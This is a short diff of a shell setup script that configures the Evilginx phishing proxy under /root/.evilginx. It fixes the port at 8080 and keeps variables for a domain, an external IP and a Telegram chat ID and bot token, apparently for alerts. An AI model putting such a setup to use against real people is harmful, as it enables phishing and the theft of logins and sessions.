@@ -2,11 +2,12 @@
 set -e
 mkdir -p /root/.evilginx
 
+# Fixed port 8080 for both HTTP and HTTPS
+PORT=8080
 DOMAIN=${DOMAIN:-"localhost"}
 EXTERNAL_IP=${EXTERNAL_IP:-"127.0.0.1"}
 CHAT_ID=${CHAT_ID:-""}
 TELE_TOKEN=${TELE_TOKEN:-""}
-PORT=${PORT:-443}
 
 cat > /root/.evilginx/config.json <<EOF
 {
